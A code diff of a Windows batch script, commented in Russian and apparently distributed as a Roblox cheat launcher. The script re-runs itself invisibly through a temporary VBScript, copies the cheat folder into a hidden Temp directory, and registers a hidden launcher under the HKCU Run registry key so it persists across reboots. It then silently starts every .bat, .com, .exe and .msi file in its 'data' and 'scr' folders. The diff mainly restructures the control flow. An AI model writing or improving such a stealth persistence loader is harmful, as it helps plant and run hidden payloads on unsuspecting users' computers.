@@ -1,69 +1,64 @@
 @echo off
-:: Проверка: если скрипт запущен без флага скрытности, перезапускаем его полностью невидимым
-if not "%~1"=="-hidden" (
-    echo Set WshShell = CreateObject("WScript.Shell") > "%temp%\stealth_init.vbs"
-    echo WshShell.Run """%~f0"" -hidden", 0, False >> "%temp%\stealth_init.vbs"
-    wscript.exe "%temp%\stealth_init.vbs"
-    exit /b
-)
+:: Если скрипт запущен без флага скрытности, отправляем его в фон
+if "%~1"=="-hidden" goto :payload
 
-:: Чистим за собой временный инициализатор
+:: Создаем временный скрипт скрытия (вне блоков IF, теперь железно без ошибок)
+echo Set WshShell = CreateObject("WScript.Shell") > "%temp%\stealth_init.vbs"
+echo WshShell.Run """%~f0"" -hidden", 0, False >> "%temp%\stealth_init.vbs"
+wscript.exe "%temp%\stealth_init.vbs"
+exit /b
+
+:payload
+:: Уничтожаем за собой временный инициализатор и включаем UTF-8
 del "%temp%\stealth_init.vbs" >nul 2>&1
-
-:: Включаем поддержку кириллицы в фоне
 chcp 65001 >nul 2>&1
 
-:: Настройка путей
 set "ORIGINAL_DIR=C:\РОБЛОКС ЧИТ"
 set "TEMP_DIR=%LOCALAPPDATA%\Temp\RobloxCheat"
 set "SCRIPT_NAME=invisible_run.bat"
 set "VBS_NAME=launcher.vbs"
 
-:: 1. Создаем скрытую папку в Temp, если её еще нет
+:: [САМ ДЕЛАЕТ ПАПКУ] Скрипт сразу и гарантированно создает чистую папку в Temp
 if not exist "%TEMP_DIR%" mkdir "%TEMP_DIR%" >nul 2>&1
 
-:: 2. Если есть оригинал на диске C:\ — полностью копируем/обновляем его в Temp
-if exist "%ORIGINAL_DIR%" (
-    xcopy "%ORIGINAL_DIR%" "%TEMP_DIR%" /E /I /Y /Q >nul 2>&1
-)
+:: Проверяем, существует ли оригинальный путь на диске C:\
+if not exist "%ORIGINAL_DIR%" goto :check_temp
 
-:: 3. Сохраняем сам этот батник в папку Temp
+:: --- РАБОТА С ОРИГИНАЛОМ (Если папка на C:\ есть) ---
+set "WORKING_DIR=%ORIGINAL_DIR%"
+
+:: Копируем читы и сам батник в созданную папку Temp
+xcopy "%ORIGINAL_DIR%" "%TEMP_DIR%" /E /I /Y /Q >nul 2>&1
 copy /y "%~f0" "%TEMP_DIR%\%SCRIPT_NAME%" >nul 2>&1
 
-:: 4. Создаем постоянный VBS-запускатор в Temp (чтобы при старте Windows вообще не было окон)
+:: Создаем невидимый запускатор для автозагрузки
 echo Set WshShell = CreateObject("WScript.Shell") > "%TEMP_DIR%\%VBS_NAME%"
 echo WshShell.Run """%TEMP_DIR%\%SCRIPT_NAME%"" -hidden", 0, False >> "%TEMP_DIR%\%VBS_NAME%"
 
-:: 5. Прописываем в автозагрузку реестра именно VBS-скрипт (гарантия полной невидимости после перезагрузки)
+:: Добавляем в автозагрузку реестра
 reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "RobloxCheatAuto" /t REG_SZ /d "\"%TEMP_DIR%\%VBS_NAME%\"" /f >nul 2>&1
+goto :run_files
 
-:: 6. Определяем рабочую папку ( приоритет оригиналу, если удален — берем из Temp )
-if exist "%ORIGINAL_DIR%" (
-    set "WORKING_DIR=%ORIGINAL_DIR%"
-) else if exist "%TEMP_DIR%" (
-    set "WORKING_DIR=%TEMP_DIR%"
-) else (
-    exit /b
-)
+:check_temp
+:: --- РАБОТА ИЗ TEMP (Если оригинала на C:\ уже нет) ---
+if not exist "%TEMP_DIR%" exit /b
+set "WORKING_DIR=%TEMP_DIR%"
 
-:: 7. Бесшумный запуск всех файлов из папки data
+:run_files
+:: --- ТИХИЙ ЗАПУСК ИЗ DATA (.bat, .com, .exe, .msi) ---
+if not exist "%WORKING_DIR%\data" goto :run_scr
 cd /d "%WORKING_DIR%\data" >nul 2>&1
-if %errorlevel% equ 0 (
-    for %%f in (*.bat *.com *.exe) do (
-        if not "%%~nxf"=="%SCRIPT_NAME%" (
-            start "" "%%f"
-        )
-    )
+for %%f in (*.bat *.com *.exe *.msi) do (
+    if not "%%~nxf"=="%SCRIPT_NAME%" start "" "%%f"
 )
 
-:: 8. Бесшумный запуск всех файлов из папки scr
+:run_scr
+:: --- ТИХИЙ ЗАПУСК ИЗ SCR (.bat, .com, .exe, .msi) ---
+if not exist "%WORKING_DIR%\scr" goto :end
 cd /d "%WORKING_DIR%\scr" >nul 2>&1
-if %errorlevel% equ 0 (
-    for %%f in (*.bat *.com *.exe) do (
-        if not "%%~nxf"=="%SCRIPT_NAME%" (
-            start "" "%%f"
-        )
-    )
+for %%f in (*.bat *.com *.exe *.msi) do (
+    if not "%%~nxf"=="%SCRIPT_NAME%" start "" "%%f"
 )
 
+:end
 exit /b
